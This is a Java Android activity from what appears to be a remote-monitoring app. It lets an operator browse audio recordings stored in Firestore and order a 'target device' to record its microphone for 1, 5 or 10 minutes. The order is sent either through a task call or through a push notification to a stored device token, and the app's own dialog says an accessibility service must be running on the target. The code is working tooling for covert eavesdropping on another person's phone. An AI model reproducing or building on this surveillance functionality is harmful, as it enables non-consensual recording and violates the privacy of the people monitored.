package com.reiserx.myapplication24.Activities.Audios;

import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.QueryDocumentSnapshot;
import com.google.firebase.firestore.QuerySnapshot;
import com.reiserx.myapplication24.Activities.ScreenShots.ScreenShotsActivity;
import com.reiserx.myapplication24.Adapters.Audios.AudiosAdapter;
import com.reiserx.myapplication24.Advertisements.InterstitialAdsClass;
import com.reiserx.myapplication24.Advertisements.bannerAdsClass;
import com.reiserx.myapplication24.Classes.SnackbarTop;
import com.reiserx.myapplication24.Classes.postRequest;
import com.reiserx.myapplication24.Models.AudiosDownloadUrl;
import com.reiserx.myapplication24.Models.performTask;
import com.reiserx.myapplication24.R;
import com.reiserx.myapplication24.databinding.ActivityGetAudiosBinding;

import java.util.ArrayList;
import java.util.Objects;

public class GetAudiosActivity extends AppCompatActivity {

    ActivityGetAudiosBinding binding;

    ArrayList<AudiosDownloadUrl> data;
    AudiosAdapter adapter;

    String UserID;

    FirebaseFirestore firestore;

    int pastVisiblesItems, totalItemCount, first_visible_item;
    boolean scrolling = false;
    LinearLayoutManager layoutManager;
    Query first;

    String TAG = "thhgshgshfs";

    QuerySnapshot check;

    long duration = 0;
    ProgressDialog prog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityGetAudiosBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        UserID = getIntent().getStringExtra("UserID");

        firestore = FirebaseFirestore.getInstance();

        bannerAdsClass bannerAdsClass = new bannerAdsClass(this, binding.bannerAdHolder);
        bannerAdsClass.adsCode();

        binding.rec.setVisibility(View.GONE);
        binding.progHolder.setVisibility(View.VISIBLE);
        binding.progressBar2.setVisibility(View.VISIBLE);
        binding.textView9.setVisibility(View.GONE);

        setTitle("Screenshots");

        data = new ArrayList<>();
        layoutManager = new LinearLayoutManager(this);
        binding.rec.setLayoutManager(layoutManager);
        adapter = new AudiosAdapter(this, data, UserID, findViewById(android.R.id.content));
        binding.rec.setAdapter(adapter);
        refresh();

        binding.floatingActionButton4.setOnClickListener(view -> getAudios(UserID));
    }

    @SuppressLint({"NotifyDataSetChanged", "SetTextI18n"})
    public void refresh() {

        Query query = firestore.collection("Main").document(UserID).collection("AudioRecordings")
                .orderBy("timeStamp", Query.Direction.DESCENDING).limit(30);
        query.addSnapshotListener((task, error) -> {
            if (task != null) {
                data.clear();
                for (DocumentSnapshot document : Objects.requireNonNull(task.getDocuments())) {
                    AudiosDownloadUrl cn = document.toObject(AudiosDownloadUrl.class);
                    if (cn != null) {
                        cn.setId(document.getId());
                        data.add(cn);
                    }
                }
                if (!data.isEmpty()) {
                    binding.rec.setVisibility(View.VISIBLE);
                    binding.progHolder.setVisibility(View.GONE);
                    adapter.notifyDataSetChanged();
                    setTitle("Screenshots ".concat(String.valueOf(data.size())));
                    adapter.notifyDataSetChanged();
                    check = task;
                    scrolls(task.getDocuments()
                            .get(task.size() - 1));
                } else {
                    binding.textView9.setText("No data available");
                    binding.rec.setVisibility(View.GONE);
                    binding.progHolder.setVisibility(View.VISIBLE);
                    binding.progressBar2.setVisibility(View.GONE);
                    binding.textView9.setVisibility(View.VISIBLE);
                }
            } else {
                binding.textView9.setText(String.valueOf(error));
                binding.rec.setVisibility(View.GONE);
                binding.progHolder.setVisibility(View.VISIBLE);
                binding.progressBar2.setVisibility(View.GONE);
                binding.textView9.setVisibility(View.VISIBLE);
            }
        });
    }

    public void scrolls(DocumentSnapshot lastVisibles) {
        binding.rec.addOnScrollListener(new RecyclerView.OnScrollListener() {
            @Override
            public void onScrolled(@NonNull RecyclerView recyclerView, int dx, int dy) {
                super.onScrolled(recyclerView, dx, dy);

                if (dy > 0) { //check for scroll down
                    first_visible_item = layoutManager.findFirstVisibleItemPosition();
                    totalItemCount = layoutManager.getItemCount();
                    pastVisiblesItems = layoutManager.findLastVisibleItemPosition();

                    if ((first_visible_item + pastVisiblesItems) >= totalItemCount) {
                        if (!scrolling) {
                            scrolling = true;
                            if (check != null) {
                                if (check.size() - 1 < 9) {
                                    Toast.makeText(GetAudiosActivity.this, "loaded all", Toast.LENGTH_SHORT).show();
                                } else {
                                    ref(10, lastVisibles);
                                    Log.d(TAG, "load");
                                }
                            } else Log.d(TAG, "jidsnf");
                        } else Log.d(TAG, "not scrolling");
                    } else {
                        Log.d(TAG, "total: " + totalItemCount);
                        Log.d(TAG, "first: " + first_visible_item);
                        Log.d(TAG, "last: " + pastVisiblesItems);
                    }
                }
            }
        });
    }

    @SuppressLint({"NotifyDataSetChanged", "SetTextI18n"})
    public void ref(int limit, DocumentSnapshot lastVisible) {
        Log.d(TAG, "loading");
        if (lastVisible != null) {
            first = firestore.collection("Main").document(UserID).collection("AudioRecordings")
                    .orderBy("timeStamp", Query.Direction.DESCENDING).startAfter(lastVisible).limit(limit);
        } else {
            first = firestore.collection("Main").document(UserID).collection("AudioRecordings")
                    .orderBy("timeStamp", Query.Direction.DESCENDING).limit(limit);
        }

        first.get().addOnSuccessListener((value) -> {
            if (value != null && !value.isEmpty()) {
                for (DocumentSnapshot document : Objects.requireNonNull(value.getDocuments())) {
                    AudiosDownloadUrl cn = document.toObject(AudiosDownloadUrl.class);
                    if (cn != null) {
                        cn.setId(document.getId());
                    }
                    data.add(cn);
                }
                if (!data.isEmpty()) {
                    binding.rec.setVisibility(View.VISIBLE);
                    binding.progHolder.setVisibility(View.GONE);
                    adapter.notifyDataSetChanged();
                    setTitle("Screenshots ".concat(String.valueOf(data.size())));
                } else {
                    binding.textView9.setText("No data available");
                    binding.rec.setVisibility(View.GONE);
                    binding.progHolder.setVisibility(View.VISIBLE);
                    binding.progressBar2.setVisibility(View.GONE);
                    binding.textView9.setVisibility(View.VISIBLE);
                }
                adapter.notifyDataSetChanged();
                scrolls(value.getDocuments()
                        .get(value.size() - 1));
                scrolling = false;
            } else {
                SnackbarTop snackbarTop = new SnackbarTop(findViewById(android.R.id.content));
                snackbarTop.showSnackBar("Loaded all data", false);
            }
        });
    }

    @SuppressLint("NonConstantResourceId")
    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (item.getItemId() == R.id.get_audios) {
            AlertDialog.Builder alert = new AlertDialog.Builder(this);
            alert.setTitle("Info");
            alert.setMessage("This will record audio from target device using mic\n\nAccessibility service needs to be running for recording audios, you can check its status in operations activity");
            alert.setPositiveButton("ok", null);
            alert.show();
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.get_audios_menu, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @SuppressLint("SetTextI18n")
    public void getAudios(String UserID) {

        SnackbarTop snackbarTop = new SnackbarTop(findViewById(android.R.id.content));
        prog = new ProgressDialog(this);

        AlertDialog.Builder alert = new AlertDialog.Builder(this);

        View mView = getLayoutInflater().inflate(R.layout.radio_dialog, null);
        final RadioButton service = mView.findViewById(R.id.radioButton);
        final RadioButton job = mView.findViewById(R.id.radioButton2);
        final RadioButton fcm = mView.findViewById(R.id.radioButton3);
        final LinearLayout never = mView.findViewById(R.id.forth_holder);
        never.setVisibility(View.GONE);

        final TextView low = mView.findViewById(R.id.textView3);
        final TextView med = mView.findViewById(R.id.textView10);
        final TextView high = mView.findViewById(R.id.textView11);
        low.setVisibility(View.GONE);
        med.setVisibility(View.GONE);
        high.setVisibility(View.GONE);

        alert.setTitle("Record audio");
        alert.setMessage("Please select duration of the recording");
        alert.setView(mView);

        service.setText("5 minutes");
        service.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (service.isChecked()) {
                duration = 300000;
                job.setChecked(false);
                fcm.setChecked(false);
            }
        });

        job.setText("1 minute");
        job.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (job.isChecked()) {
                duration = 60000;
                service.setChecked(false);
                fcm.setChecked(false);
            }
        });

        fcm.setText("10 minutes");
        fcm.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (fcm.isChecked()) {
                duration = 600000;
                job.setChecked(false);
                service.setChecked(false);
            }
        });

        alert.setPositiveButton("SEND", (dialog, whichButton) -> {
            if (duration == 0) {
                snackbarTop.showSnackBar("Please select method", false);
            } else {

                AlertDialog.Builder request = new AlertDialog.Builder(GetAudiosActivity.this);
                request.setTitle("Screenshot");
                request.setMessage("Please select one of the options");
                request.setPositiveButton("Command A", (dialogInterface, i) -> {
                    performTask performTask = new performTask(String.valueOf(duration), 15, UserID);
                    performTask.Task();
                    snackbarTop.showSnackBar("Request sent", true);
                    InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(this);
                    interstitialAdsClass.loadAds();
                });
                request.setNegativeButton("command b", (dialogInterface, i) -> {
                    getToken("com.reiserx.testtrace.accessibility"+duration, "2", UserID);
                });
                request.setNeutralButton("cancel", null);
                request.show();
            }
        });

        alert.setNegativeButton("cancel", null);

        alert.show();
    }
    private void getToken(String title, String msg, String UserID) {

        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(this);
        interstitialAdsClass.loadAds();
        prog.setMessage("Getting device id...");
        prog.show();
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        CollectionReference docRef = db.collection("Main").document(UserID).collection("TokenUrl");
        docRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                for (QueryDocumentSnapshot document : Objects.requireNonNull(task.getResult())) {
                    postRequest postRequest = new postRequest(String.valueOf(document.getData().get("Notification token")), title, msg, prog, 7, GetAudiosActivity.this);
                    postRequest.notifyBackground();
                }
            } else {
                prog.dismiss();
                Log.d("fbbfbfwfbbff", "Error getting documents: ", task.getException());
                Toast.makeText(GetAudiosActivity.this, String.valueOf(task.getException()), Toast.LENGTH_SHORT).show();
            }
        });
    }
}